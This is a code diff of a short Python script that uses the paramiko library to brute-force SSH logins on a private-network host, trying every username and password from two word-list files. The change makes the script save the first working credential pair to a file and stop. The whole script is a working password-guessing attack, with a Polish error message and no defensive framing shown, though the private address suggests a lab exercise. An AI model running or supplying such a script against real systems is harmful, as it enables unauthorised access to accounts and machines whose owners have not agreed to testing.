@@ -1,4 +1,6 @@
 import paramiko
+
+
 def logging_ssh(hostname, username, password):
     ssh_session = paramiko.SSHClient()
     ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -10,6 +12,8 @@ def logging_ssh(hostname, username, password):
         print("Nie poprawne haslo lub login")
         ssh_session.close()
         return False
+
+
 hostname = "192.168.55.8"
 usernames = []
 passwords = []
@@ -21,4 +25,7 @@ with open("passwords.txt", encoding="UTF-8") as f:
         passwords.append(line.strip().lower())
 for username in usernames:
     for password in passwords:
-        logging_ssh(hostname, username, password)
+        if logging_ssh(hostname, username, password):
+            with open(f"password_to_{username}.txt", "w", encoding="utf-8") as f:
+                f.write(f"login: {username}\nPassword: {password}")
+            exit()
